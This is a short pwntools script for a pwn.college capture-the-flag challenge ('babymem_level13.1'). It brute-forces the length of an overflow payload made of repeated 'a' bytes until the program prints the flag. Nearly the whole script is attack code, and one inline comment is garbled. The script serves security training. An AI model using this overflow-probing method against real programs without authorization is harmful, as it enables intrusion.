from pwn import *


i = 1
while True:
    p = process('/challenge/babymem_level13.1')

    p.recvuntil('Payload size:')
    #num = bytes(str(i),'utf-8')
    p.sendline(str(i)) # or a just bif int(2000 effect 

    payload =  b'a' * i

    #p.recvline('Send your payload')
    p.sendline(payload)
    i+=1
    #p.interactive()
    s = p.recvall(1)
    if s.find(b'pwn.college{') != -1:
        print(s)
        break

